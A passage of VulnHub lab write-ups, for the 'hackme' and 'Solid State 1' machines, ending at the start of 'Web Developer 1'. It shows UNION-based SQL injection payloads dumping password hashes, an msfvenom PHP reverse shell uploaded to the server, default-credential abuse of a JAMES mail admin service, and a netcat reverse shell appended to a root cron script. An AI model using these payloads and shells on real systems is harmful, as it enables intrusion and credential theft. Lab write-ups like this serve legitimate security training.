<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>dirb http://192.168.179.186 <span class="nt">-r</span>
...
<span class="nt">----</span> Scanning URL: http://192.168.179.186/ <span class="nt">----</span>
+ http://192.168.179.186/index.php <span class="o">(</span>CODE:200|SIZE:100<span class="o">)</span>
+ http://192.168.179.186/server-status <span class="o">(</span>CODE:403|SIZE:303<span class="o">)</span>
<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.186/uploads/
</code></pre></div></div>

<p>We create a user account to log in to the web application.</p>

<p><img src="/assets/images/hackme/screenshot-2.png" alt="" /></p>

<p>We log in with the account created earlier.</p>

<p><img src="/assets/images/hackme/screenshot-3.png" alt="" /></p>

<p>A SQL Injection was discovered in the search field, as we can see when trying to inject it all the records were displayed in the browser.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' or 1=1 #
</span></code></pre></div></div>

<p><img src="/assets/images/hackme/screenshot-4.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="sql-injection">SQL Injection</h3>

<p>Our first step of the attack is identify the column numbers, we see that there are three columns.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' or 1=1 order by 3 #
</span></code></pre></div></div>

<p><img src="/assets/images/hackme/screenshot-5.png" alt="" /></p>

<p>Once the number of columns has been identified, we create the following UNION statement, to see if the injected numbers are displayed in the browser.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' and 1=2 union select 1,2,3 #
</span></code></pre></div></div>

<p><img src="/assets/images/hackme/screenshot-6.png" alt="" /></p>

<p>As we see in the screenshot above, all the numbers injected in each column are displayed, which facilitates our exploitation process.</p>

<p>Retrieving mysql version.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' and 1=2 union select @@version,2,3 #
</span></code></pre></div></div>

<p><img src="/assets/images/hackme/screenshot-7.png" alt="" /></p>

<p>Retrieving the current database.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' and 1=2 union select database(),2,3 #
</span></code></pre></div></div>

<p><img src="/assets/images/hackme/screenshot-8.png" alt="" /></p>

<p>Retrieving the mysql home directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' and 1=2 union select @@datadir,2,3 #
</span></code></pre></div></div>

<p><img src="/assets/images/hackme/screenshot-9.png" alt="" /></p>

<p>Retrieving the user that the web application is using to connect to the database.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' and 1=2 union select user(),2,3 #
</span></code></pre></div></div>

<p><img src="/assets/images/hackme/screenshot-10.png" alt="" /></p>

<p>Retrieving users with file privileges enabled.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' and 1=2 union select user,2,3 from mysql.user where file_priv='</span>Y<span class="s1">' #
</span></code></pre></div></div>

<p><img src="/assets/images/hackme/screenshot-11.png" alt="" /></p>

<p>When trying to read the <strong>/etc/passwd</strong> file, it was not possible.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' and 1=2 union select load_file('</span>/etc/passwd<span class="s1">'),2,3 #
</span></code></pre></div></div>

<p><img src="/assets/images/hackme/screenshot-12.png" alt="" /></p>

<p>Retrieving the tables from the database that the web application is using.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' and 1=2 union select table_name,2,3 from information_schema.tables where table_schema=database() #
</span></code></pre></div></div>

<p><img src="/assets/images/hackme/screenshot-13.png" alt="" /></p>

<p>Retrieving the columns from the table <strong>users</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' and 1=2 union select column_name,2,3 from information_schema.columns where table_schema=database() and table_name='</span><span class="nb">users</span><span class="s1">' #
</span></code></pre></div></div>

<p><img src="/assets/images/hackme/screenshot-14.png" alt="" /></p>

<p>Retrieving the records from the table <strong>users</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' and 1=2 union select concat_ws('</span>:<span class="s1">',user,pasword),2,3 from users #
</span></code></pre></div></div>

<p><img src="/assets/images/hackme/screenshot-15.png" alt="" /></p>

<p>I saved the credentials into a file for easy use later.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-sL</span> <span class="nt">-b</span> <span class="s2">"PHPSESSID=tgq6veet5bs049gijo8pblgo3o"</span> <span class="s2">"http://192.168.179.186/welcome.php"</span> <span class="nt">--data</span> <span class="s2">"search='+and+1=2+union+select+concat_ws(':',user,pasword),2,3+from+users+#"</span> | <span class="nb">grep</span> <span class="s1">'SGD'</span> | <span class="nb">sed</span> <span class="s1">'s/&lt;td&gt;/\n/g'</span> | <span class="nb">grep</span> <span class="nt">-Pv</span> <span class="s1">'^[\d\s]'</span> | <span class="nb">sed</span> <span class="s1">'s/\(.*\)&lt;.*/\1/'</span> | <span class="nb">tee </span>creds.txt 
user1:5d41402abc4b2a76b9719d911017c592
user2:6269c4f71a55b24bad0f0267d9be5508
user3:0f359740bd1cda994f8b55330c86d845
<span class="nb">test</span>:05a671c66aefea124cc08b76ea6d30bb
superadmin:2386acb2cf356944177746fc92523983
test1:05a671c66aefea124cc08b76ea6d30bb
admin:5f4dcc3b5aa765d61d8327deb882cf99
root@kali:~<span class="err">$</span>
</code></pre></div></div>

<p>Then the hashes were cracked in <a href="https://hashes.com">https://hashes.com</a>.</p>

<p><img src="/assets/images/hackme/screenshot-16.png" alt="" /></p>

<p>I just played with regular expressions to align the hashes with their respective password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="k">for </span>x <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>creds.txt | <span class="nb">sed</span> <span class="s1">'$d'</span><span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$x</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s2">":"</span> <span class="s1">'{print $1}'</span><span class="si">)</span><span class="s2">:</span><span class="si">$(</span><span class="nb">grep</span> <span class="si">$(</span><span class="nb">echo</span> <span class="nv">$x</span> | <span class="nb">awk</span> <span class="nt">-F</span><span class="s2">":"</span> <span class="s1">'{print $NF}'</span><span class="si">)</span> cracked.txt<span class="si">)</span><span class="s2">"</span><span class="p">;</span> <span class="k">done
</span>user1:5d41402abc4b2a76b9719d911017c592:hello
user2:6269c4f71a55b24bad0f0267d9be5508:commando
user3:0f359740bd1cda994f8b55330c86d845:p@ssw0rd
<span class="nb">test</span>:05a671c66aefea124cc08b76ea6d30bb:testtest
superadmin:2386acb2cf356944177746fc92523983:Uncrackable
test1:05a671c66aefea124cc08b76ea6d30bb:testtest
</code></pre></div></div>

<p>When logged in as user <strong>superadmin</strong>, it was noted that it has a file upload feature.</p>

<p><img src="/assets/images/hackme/screenshot-17.png" alt="" /></p>

<p><img src="/assets/images/hackme/screenshot-18.png" alt="" /></p>

<p>We generate a php reverse shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>msfvenom <span class="nt">-p</span> php/reverse_perl <span class="nv">lhost</span><span class="o">=</span>192.168.179.1 <span class="nv">lport</span><span class="o">=</span>443 <span class="nt">-o</span> z.php
</code></pre></div></div>

<p>We uploaded the reverse shell to the server, the upload was successful because there is not type of validation to prevent uploading arbitrary files.</p>

<p><img src="/assets/images/hackme/screenshot-19.png" alt="" /></p>

<p><img src="/assets/images/hackme/screenshot-20.png" alt="" /></p>

<p>We can note that the file was uploaded in the <strong>/uploads</strong> directory.</p>

<p><img src="/assets/images/hackme/screenshot-21.png" alt="" /></p>

<p>We start a netcat listener and execute the following curl command which will interpret our php reverse shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl http://192.168.179.186/uploads/z.php
</code></pre></div></div>

<p>We have obtained a shell with low privileges.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.186] 55592
script <span class="nt">-qc</span> /bin/bash /dev/null
www-data@hackme:/var/www/html/uploads<span class="nv">$ </span>
</code></pre></div></div>

<p>Enumerating the SUID binaries an unusual file was found in the legacy home directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@hackme:/var/www/html<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-la</span> <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
...
<span class="nt">-rwsr--r-x</span> 1 root root 8472 Mar 26  2019 /home/legacy/touchmenot
...
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="suid-binary">SUID Binary</h3>

<p>When executing the <strong>/home/legacy/touchmenot</strong> binary this granted root access.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@hackme:/var/www/html<span class="nv">$ </span>/home/legacy/touchmenot
/home/legacy/touchmenot
root@hackme:/var/www/html# <span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
root@hackme:/var/www/html# su -
su -
root@hackme:~# <span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@hackme:~#
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - Solid State 1</h1>
	<p class="post-date text-bold text-upcase">
	<span>January 2022</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> It was originally created for HackTheBox</p>

<p><strong>Author:</strong> Ch33z_plz</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell and read the flag.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/solidstate-1,261/">https://www.vulnhub.com/entry/solidstate-1,261/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>The following command performs a ping scan to discover the target machine on the local network.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-sn</span> 192.168.179.0/24
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-04 13:56 <span class="nt">-05</span>
Nmap scan report <span class="k">for </span>192.168.179.185
...
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>To detect open ports a full TCP port scan was performed with nmap.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-T4</span> <span class="nt">-p-</span> 192.168.179.185 <span class="nt">-oG</span> nmap/all.tcp-ports.txt 
...
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip
...
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>With the aim of discovering information about open ports running on the server, an aggressive scan was did with nmap, it enable the OS detection, version enumeration, script scanning and traceroute.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-p22</span>,25,80,110,119,4555 <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-Pn</span> 192.168.179.185 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT     STATE SERVICE     VERSION                                                                                                                                  
22/tcp   open  tcpwrapped                                                                                                                                           
| ssh-hostkey:                                                                                                                                                      
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b <span class="o">(</span>RSA<span class="o">)</span>                                                                                                      
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 <span class="o">(</span>ECDSA<span class="o">)</span>                                                                                                     
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 <span class="o">(</span>ED25519<span class="o">)</span>                                                                                                   
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org <span class="o">(</span>192.168.179.1 <span class="o">[</span>192.168.179.1]<span class="o">)</span>, PIPELINING, ENHANCEDSTATUSCODES, 
80/tcp   open  http        Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Home - Solid State Security 
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd <span class="o">(</span>posting ok<span class="o">)</span>
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
...
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>A web page is running in the web service, but was not possible to find valuable information.</p>

<p><img src="/assets/images/solidstate/screenshot-1.png" alt="" /></p>

<p>The directory brute forcing with gobuster also did not disclosed information that would help to compromise the system.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.185/ <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-e</span> <span class="nt">-x</span> html,php,txt
...
http://192.168.179.185/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 319] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.185/images/]
http://192.168.179.185/about.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 7182]                                    
http://192.168.179.185/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 7776]                                    
http://192.168.179.185/services.html        <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 8404]                                    
http://192.168.179.185/assets               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 319] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.185/assets/]
http://192.168.179.185/README.txt           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 963]                                     
http://192.168.179.185/LICENSE.txt          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 17128]                                   
http://192.168.179.185/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 303]
</code></pre></div></div>

<h3 id="enumeration-on-port-4555">Enumeration on port 4555</h3>

<p>By connecting on port 4545, we see that it service requires authentication, but using root as username and password we have successfull access.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>telnet 192.168.179.185 4555
Trying 192.168.179.185...
Connected to 192.168.179.185.
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login <span class="nb">id</span>:
root
Password:
root
Welcome root. HELP <span class="k">for </span>a list of commands
</code></pre></div></div>

<p>Executing the <strong>help</strong> command we can see the list of available commands to the root user.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">help
</span>Currently implemented commands:
<span class="nb">help                                    </span>display this <span class="nb">help
</span>listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser <span class="o">[</span>username] <span class="o">[</span>password]           add a new user
verify <span class="o">[</span>username]                       verify <span class="k">if </span>specified user exist
deluser <span class="o">[</span>username]                      delete existing user
setpassword <span class="o">[</span>username] <span class="o">[</span>password]       sets a user<span class="s1">'s password
setalias [user] [alias]                 locally forwards all email for '</span>user<span class="s1">' to '</span><span class="nb">alias</span><span class="s1">'
showalias [username]                    shows a user'</span>s current email <span class="nb">alias
</span>unsetalias <span class="o">[</span>user]                       unsets an <span class="nb">alias </span><span class="k">for</span> <span class="s1">'user'</span>
setforwarding <span class="o">[</span>username] <span class="o">[</span>emailaddress] forwards a user<span class="s1">'s email to another email address
showforwarding [username]               shows a user'</span>s current email forwarding
unsetforwarding <span class="o">[</span>username]              removes a forward
user <span class="o">[</span>repositoryname]                   change to another user repository
shutdown                                kills the current JVM <span class="o">(</span>convenient when James is run as a daemon<span class="o">)</span>
quit                                    close connection
</code></pre></div></div>

<p>We list the users by typing the <strong>listusers</strong> command.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
</code></pre></div></div>

<p>We create the user <strong>s4rgaz</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>adduser s4rgaz 123
User s4rgaz added
listusers
Existing accounts 6
user: james
user: thomas
user: john
user: mindy
user: s4rgaz
user: mailadmin
quit
Bye
Connection closed by foreign host.
root@kali:~<span class="err">$</span>
</code></pre></div></div>

<h3 id="enumeration-on-service-pop3">Enumeration on service pop3</h3>

<p>By logging in to pop3 service as user <strong>s4rgaz</strong>, we have successful access, so we can manage the users to be able to access to pop3 service.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>telnet 192.168.179.185 110
Trying 192.168.179.185...
Connected to 192.168.179.185.
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
+OK solidstate POP3 server <span class="o">(</span>JAMES POP3 Server 2.3.2<span class="o">)</span> ready 
user s4rgaz
+OK
pass 123
+OK Welcome s4rgaz
list
+OK 0 0
<span class="nb">.</span>
quit
+OK Apache James POP3 Server signing off.
Connection closed by foreign host.
root@kali:~<span class="err">$</span>
</code></pre></div></div>

<p>We go back to the service running on port 4545 and change john’s password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>telnet 192.168.179.185 4555
Trying 192.168.179.185...
Connected to 192.168.179.185.
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login <span class="nb">id</span>:
root
Password:
root
Welcome root. HELP <span class="k">for </span>a list of commands
setpassword john john
Password <span class="k">for </span>john reset
</code></pre></div></div>

<p>We log in on pop3 service as user john, in the mail it indicates that access to <strong>mindy</strong> is restricted.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>telnet 192.168.179.185 110
Trying 192.168.179.185...
Connected to 192.168.179.185.
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
+OK solidstate POP3 server <span class="o">(</span>JAMES POP3 Server 2.3.2<span class="o">)</span> ready 
user john
+OK
pass john
+OK Welcome john
list
+OK 1 743
1 743
<span class="nb">.</span>
retr 1
+OK Message follows
Return-Path: &lt;mailadmin@localhost&gt;
Message-ID: &lt;9564574.1.1503422198108.JavaMail.root@solidstate&gt;
MIME-Version: 1.0
Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 <span class="o">([</span>192.168.11.142]<span class="o">)</span>
          by solidstate <span class="o">(</span>JAMES SMTP Server 2.3.2<span class="o">)</span> with SMTP ID 581
          <span class="k">for</span> &lt;john@localhost&gt;<span class="p">;</span>
          Tue, 22 Aug 2017 13:16:20 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>
Date: Tue, 22 Aug 2017 13:16:20 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy<span class="s1">'s access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James
</span></code></pre></div></div>

<p>Then we change mindy’s password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>telnet 192.168.179.185 4555
Trying 192.168.179.185...
Connected to 192.168.179.185.
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login <span class="nb">id</span>:
root
Password:
root
Welcome root. HELP <span class="k">for </span>a list of commands
setpassword mindy mindy
Password <span class="k">for </span>mindy reset
</code></pre></div></div>

<p>We login as user <strong>mindy</strong> on pop3 service and see her SSH login credentials.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>telnet 192.168.179.185 110                                                                                                                  
Trying 192.168.179.185...                                                                                                                                           
Connected to 192.168.179.185.                                                                                                                                       
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>                                                                                                                                           
+OK solidstate POP3 server <span class="o">(</span>JAMES POP3 Server 2.3.2<span class="o">)</span> ready                                                                                                          
user mindy                                                                                                                                                          
+OK                                                                                                                                                                 
pass mindy                                                                                                                                                          
+OK Welcome mindy                                                                                                                                                   
list                                                                                                                                                                
+OK 2 1945                                                                                                                                                          
1 1109                                                                                                                                                              
2 836                                                                                                                                                               
<span class="nb">.</span> 
retr 2
+OK Message follows
Return-Path: &lt;mailadmin@localhost&gt;
Message-ID: &lt;16744123.2.1503422270399.JavaMail.root@solidstate&gt;
MIME-Version: 1.0
Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 <span class="o">([</span>192.168.11.142]<span class="o">)</span>
          by solidstate <span class="o">(</span>JAMES SMTP Server 2.3.2<span class="o">)</span> with SMTP ID 581
          <span class="k">for</span> &lt;mindy@localhost&gt;<span class="p">;</span>
          Tue, 22 Aug 2017 13:17:28 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>
Date: Tue, 22 Aug 2017 13:17:28 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>
<h3 id="access-via-ssh">Access via SSH</h3>

<p>We access to the server via SSH as user <strong>mindy</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-l</span> mindy 192.168.179.185 
mindy@192.168.179.185<span class="s1">'s password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
mindy@solidstate:~$
</span></code></pre></div></div>

<p>We found the flag in her home directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mindy@solidstate:~<span class="nv">$ </span><span class="nb">ls
</span>bin  user.txt
mindy@solidstate:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
914d0a4ebc1777889b5b89a23f556fd75
mindy@solidstate:~<span class="err">$</span>
</code></pre></div></div>

<p>By trying to execute some system commands, we see that we are under a restricted shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mindy@solidstate:~<span class="nv">$ </span><span class="nb">cd </span>bin/
<span class="nt">-rbash</span>: <span class="nb">cd</span>: restricted
mindy@solidstate:~<span class="nv">$ </span>ip addr
<span class="nt">-rbash</span>: ip: <span class="nb">command </span>not found
mindy@solidstate:~
</code></pre></div></div>

<p>To bypass the jailed shell, we type <strong>bash -i</strong> to the SSH command.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-l</span> mindy 192.168.179.185 <span class="s2">"bash -i"</span>                          
mindy@192.168.179.185<span class="s1">'s password: 
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ id
id
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$
</span></code></pre></div></div>

<p>Now we can run any system command, a python script was found in the <strong>/opt</strong> directory, probably a cron job is running this file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/opt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="nb">ls</span> <span class="nt">-la</span>
total 16
drwxr-xr-x  3 root root 4096 Aug 22  2017 <span class="nb">.</span>
drwxr-xr-x 22 root root 4096 Jun 18  2017 ..
drwxr-xr-x 11 root root 4096 Aug 22  2017 james-2.3.2
<span class="nt">-rwxrwxrwx</span>  1 root root  105 Aug 22  2017 tmp.py
<span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/opt<span class="nv">$ </span><span class="nb">cat </span>tmp.py
<span class="nb">cat </span>tmp.py
<span class="c">#!/usr/bin/env python</span>
import os
import sys
try:
     os.system<span class="o">(</span><span class="s1">'rm -r /tmp/* '</span><span class="o">)</span>
except:
     sys.exit<span class="o">()</span>

<span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/opt<span class="err">$</span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="cron-job">Cron Job</h3>

<p>We add the following instruction to the end of the <strong>tmp.py</strong> file, when the cron job executes the script, it will try to connect to my attacking machine, giving us a root shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/opt<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"os.system('nc 192.168.179.1 1337 -e /bin/bash')"</span> <span class="o">&gt;&gt;</span> tmp.py
</code></pre></div></div>

<p>We set up a netcat listener on port 1337, wait a moment and we have a root shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 1337
listening on <span class="o">[</span>any] 1337 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.185] 40466
script <span class="nt">-qc</span> /bin/bash /dev/null
root@solidstate:~# <span class="nb">ls
ls
</span>root.txt
root@solidstate:~# <span class="nb">cat </span>root.txt
<span class="nb">cat </span>root.txt
b4c9723a28899b1c45db281d99cc87c9
root@solidstate:~#
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - Web Developer 1</h1>
	<p class="post-date text-bold text-upcase">
	<span>January 2022</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> A machine specially designed to be vulnerable with certain changes to its previous version.</p>

<p><strong>Author:</strong> Fred Wemeijer</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell and read the flag.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/web-developer-1,288/">https://www.vulnhub.com/entry/web-developer-1,288/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>We start discovering our target in the local network with netdiscover.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>netdiscover <span class="nt">-i</span> vmnet1 <span class="nt">-r</span> 192.168.179.0/24  
 Currently scanning: Finished!   |   Screen View: Unique Hosts      
                                                                   
 6 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 342      
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 <span class="nt">-----------------------------------------------------------------------------</span>
 192.168.179.184 00:0c:29:fc:85:b7      5     300  VMware, Inc.
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

